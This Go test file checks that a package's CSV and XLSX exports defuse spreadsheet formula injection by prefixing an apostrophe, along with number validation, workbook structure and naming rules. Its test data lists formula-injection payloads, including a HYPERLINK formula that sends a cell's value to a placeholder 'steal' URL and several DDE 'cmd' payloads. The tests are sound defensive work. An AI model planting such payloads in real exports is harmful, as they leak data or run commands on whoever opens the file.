package tabular_test

import (
	"archive/zip"
	"bytes"
	"encoding/csv"
	"encoding/xml"
	"errors"
	"io"
	"slices"
	"strings"
	"testing"

	"github.com/crewlet/crewlet/internal/tabular"
)

// formulas are values somebody else could type into a shared record, each of
// which a spreadsheet would run when the download is opened.
var formulas = []string{
	`=HYPERLINK("http://example.com/steal?"&A1,"click")`,
	"+cmd|' /C calc'!A0",
	"-2+3+cmd|' /C calc'!A0",
	"@SUM(1+1)*cmd|' /C calc'!A0",
	"\t=1+1",
	"\r=1+1",
}

// A FORMULA CELL IS NEVER RUN, in either format.
//
// Every value a spreadsheet reads as a formula is written with the apostrophe
// that makes it text, a plain number is left a number (a negative one
// included), and an XLSX cell is an inline string that carries no formula
// element at all. Mutation: drop the apostrophe in Neutralise, or write an XLSX
// text cell as `t="str"` with an `<f>`, and this goes red.
func TestAFormulaCellIsNeverRun(t *testing.T) {
	t.Parallel()
	for _, f := range formulas {
		if got := tabular.Neutralise(f); got != "'"+f {
			t.Errorf("Neutralise(%q) = %q, want it opened with an apostrophe", f, got)
		}
	}
	for _, plain := range []string{"-12", "+3.5", "42", "plain text", ""} {
		if got := tabular.Neutralise(plain); got != plain {
			t.Errorf("Neutralise(%q) = %q, want it unchanged", plain, got)
		}
	}

	rows := [][]tabular.Cell{}
	for _, f := range formulas {
		rows = append(rows, []tabular.Cell{tabular.Text(f), tabular.Number("-7")})
	}

	t.Run("csv", func(t *testing.T) {
		t.Parallel()
		var buf bytes.Buffer
		if err := tabular.WriteCSV(&buf, []string{"=Title", "Count"}, rows); err != nil {
			t.Fatal(err)
		}
		records, err := csv.NewReader(&buf).ReadAll()
		if err != nil {
			t.Fatal(err)
		}
		if records[0][0] != "'=Title" {
			t.Errorf("the header cell is %q, want it neutralised too", records[0][0])
		}
		for i, f := range formulas {
			if got := records[i+1][0]; got != "'"+f {
				t.Errorf("row %d's text is %q, want %q", i, got, "'"+f)
			}
			if got := records[i+1][1]; got != "-7" {
				t.Errorf("row %d's number is %q, want -7", i, got)
			}
		}
	})

	t.Run("xlsx", func(t *testing.T) {
		t.Parallel()
		var buf bytes.Buffer
		if err := tabular.WriteXLSX(&buf, "Tasks", []string{"=Title", "Count"}, rows); err != nil {
			t.Fatal(err)
		}
		sheet := part(t, buf.Bytes(), "xl/worksheets/sheet1.xml")
		if strings.Contains(sheet, "<f>") || strings.Contains(sheet, `t="str"`) {
			t.Errorf("the worksheet carries a formula: %s", sheet)
		}
		got := cells(t, sheet)
		if got[0][0].text != "'=Title" {
			t.Errorf("the header cell is %q, want it neutralised too", got[0][0].text)
		}
		for i, f := range formulas {
			if c := got[i+1][0]; c.text != "'"+f || c.kind != "inlineStr" {
				t.Errorf("row %d's text cell is %+v, want the inline string %q", i, c, "'"+f)
			}
			if c := got[i+1][1]; c.text != "-7" || c.kind != "" {
				t.Errorf("row %d's number cell is %+v, want the number -7", i, c)
			}
		}
	})
}

// A NUMBER IS A NUMBER ONLY WHEN IT READS AS ONE: a value a writer called
// numeric that does not parse as a finite decimal is written as text, so a
// spreadsheet never holds a number it cannot read back. Mutation: trust the
// writer's word and `Inf` reaches a `<v>`.
func TestANumberThatDoesNotParseIsWrittenAsText(t *testing.T) {
	t.Parallel()
	for _, s := range []string{"Inf", "NaN", "0x10", "1_000", "", "12 tasks"} {
		if tabular.Number(s).Numeric {
			t.Errorf("Number(%q) is numeric", s)
		}
	}
	for _, s := range []string{"0", "-3.25", "1e6", "1200"} {
		if !tabular.Number(s).Numeric {
			t.Errorf("Number(%q) is not numeric", s)
		}
	}
}

// THE WORKBOOK OPENS: every part a spreadsheet reads is present, the sheet is
// named as the format allows, the cells sit at their own references, and text
// a part could not carry (a control character, markup) is escaped rather than
// breaking the file. Mutation: drop the escape and the worksheet no longer
// parses.
func TestAnXLSXWorkbookIsAWellFormedPackage(t *testing.T) {
	t.Parallel()
	var buf bytes.Buffer
	rows := [][]tabular.Cell{{tabular.Text("<b>a & b</b>\x01"), tabular.Number("3")}}
	if err := tabular.WriteXLSX(&buf, "Spend: by [seat]", []string{"Seat", "Tokens"}, rows); err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"[Content_Types].xml", "_rels/.rels", "xl/workbook.xml",
		"xl/_rels/workbook.xml.rels", "xl/worksheets/sheet1.xml"} {
		body := part(t, buf.Bytes(), name)
		if err := xml.NewDecoder(strings.NewReader(body)).Decode(new(any)); err != nil &&
			!errors.Is(err, io.EOF) {
			t.Errorf("%s does not parse: %v", name, err)
		}
	}
	if wb := part(t, buf.Bytes(), "xl/workbook.xml"); !strings.Contains(wb, `name="Spend  by  seat"`) {
		t.Errorf("the workbook names its sheet %s", wb)
	}
	got := cells(t, part(t, buf.Bytes(), "xl/worksheets/sheet1.xml"))
	if got[1][0].ref != "A2" || got[1][1].ref != "B2" {
		t.Errorf("the second row's cells are at %s and %s, want A2 and B2", got[1][0].ref, got[1][1].ref)
	}
	if got[1][0].text != "<b>a & b</b>�" {
		t.Errorf("the escaped cell reads back as %q", got[1][0].text)
	}
	again := bytes.Buffer{}
	if err := tabular.WriteXLSX(&again, "Spend: by [seat]", []string{"Seat", "Tokens"}, rows); err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(buf.Bytes(), again.Bytes()) {
		t.Error("one table wrote two different files")
	}
}

// A CELL PAST THE FORMAT IS REFUSED, NEVER CUT, because a download that dropped
// the end of a value would be read as the whole of it. Mutation: truncate
// instead and the error is gone.
func TestACellPastTheFormatIsRefused(t *testing.T) {
	t.Parallel()
	long := strings.Repeat("x", tabular.MaxXLSXCellChars+1)
	err := tabular.WriteXLSX(io.Discard, "s", []string{"a"}, [][]tabular.Cell{{tabular.Text(long)}})
	if !errors.Is(err, tabular.ErrTooLarge) {
		t.Errorf("a %d character cell = %v, want ErrTooLarge", len(long), err)
	}
}

// Columns are named as a spreadsheet names them.
func TestColumnNames(t *testing.T) {
	t.Parallel()
	for i, want := range map[int]string{0: "A", 25: "Z", 26: "AA", 51: "AZ", 52: "BA",
		701: "ZZ", 702: "AAA", tabular.MaxXLSXColumns - 1: "XFD"} {
		if got := tabular.ColumnName(i); got != want {
			t.Errorf("ColumnName(%d) = %q, want %q", i, got, want)
		}
	}
	for in, want := range map[string]string{"": "Sheet1", "'quoted'": "quoted",
		strings.Repeat("a", 40): strings.Repeat("a", 31), "a/b": "a b"} {
		if got := tabular.SheetName(in); got != want {
			t.Errorf("SheetName(%q) = %q, want %q", in, got, want)
		}
	}
}

// part is one named part of an XLSX package.
func part(t *testing.T, file []byte, name string) string {
	t.Helper()
	r, err := zip.NewReader(bytes.NewReader(file), int64(len(file)))
	if err != nil {
		t.Fatal(err)
	}
	i := slices.IndexFunc(r.File, func(f *zip.File) bool { return f.Name == name })
	if i < 0 {
		t.Fatalf("the package holds no %s", name)
	}
	rc, err := r.File[i].Open()
	if err != nil {
		t.Fatal(err)
	}
	defer rc.Close()
	body, err := io.ReadAll(rc)
	if err != nil {
		t.Fatal(err)
	}
	return string(body)
}

type readCell struct{ ref, kind, text string }

// cells reads a worksheet back, row by row.
func cells(t *testing.T, sheet string) [][]readCell {
	t.Helper()
	var doc struct {
		Rows []struct {
			Cells []struct {
				Ref    string `xml:"r,attr"`
				Kind   string `xml:"t,attr"`
				Value  string `xml:"v"`
				Inline string `xml:"is>t"`
			} `xml:"c"`
		} `xml:"sheetData>row"`
	}
	if err := xml.Unmarshal([]byte(sheet), &doc); err != nil {
		t.Fatalf("the worksheet does not parse: %v", err)
	}
	var out [][]readCell
	for _, row := range doc.Rows {
		var r []readCell
		for _, c := range row.Cells {
			text := c.Value
			if c.Kind == "inlineStr" {
				text = c.Inline
			}
			r = append(r, readCell{c.Ref, c.Kind, text})
		}
		out = append(out, r)
	}
	return out
}
